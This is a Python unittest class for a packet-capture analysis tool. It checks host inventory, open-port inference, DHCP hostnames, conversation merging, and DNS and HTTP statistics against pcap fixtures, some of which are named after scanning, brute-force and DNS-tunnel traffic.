class TestHostsAndStatistics(unittest.TestCase):
    def test_host_inventory_and_os_guess(self):
        packets = read_pcap(_p("nmap_connect"))
        hosts = build_hosts(packets)
        self.assertIn("192.168.1.50", hosts)
        self.assertIsNotNone(hosts["192.168.1.50"].os_guess)

    def test_open_port_inference(self):
        packets = read_pcap(_p("nmap_connect"))
        hosts = build_hosts(packets)
        self.assertIn(22, hosts["192.168.1.10"].open_ports)

    def test_dhcp_hostname_attributed_to_assigned_ip_not_zero_addr(self):
        packets = read_pcap(_p("dhcp_nbns_kerberos"))
        hosts = build_hosts(packets)
        self.assertIn("WIN-016", hosts["192.168.1.16"].hostnames)

    def test_conversations_merge_both_directions(self):
        packets = read_pcap(_p("ftp_bruteforce"))
        convos = build_conversations(packets)
        # every conversation packet count should be >= 2 (request + response)
        self.assertTrue(all(c.packets >= 1 for c in convos))
        self.assertTrue(sum(c.packets for c in convos) <= len(packets))

    def test_resolved_addresses(self):
        packets = read_pcap(_p("clean_baseline"))
        resolved = resolved_addresses(packets)
        self.assertIn("93.184.216.34", resolved)
        self.assertIn("www.example.com", resolved["93.184.216.34"])

    def test_protocol_hierarchy_and_capture_summary(self):
        packets = read_pcap(_p("http_traffic"))
        hier = protocol_hierarchy(packets)
        self.assertIn("tcp.http", hier)
        summary = capture_summary(packets)
        self.assertEqual(summary["packet_count"], len(packets))

    def test_dns_stats(self):
        packets = read_pcap(_p("dns_tunnel"))
        stats = dns_stats(packets)
        self.assertGreaterEqual(stats.total_queries, 20)

    def test_http_stats(self):
        packets = read_pcap(_p("http_traffic"))
        stats = http_stats(packets)
        self.assertGreaterEqual(stats.total_requests, 5)
        self.assertIn("GET", stats.methods)


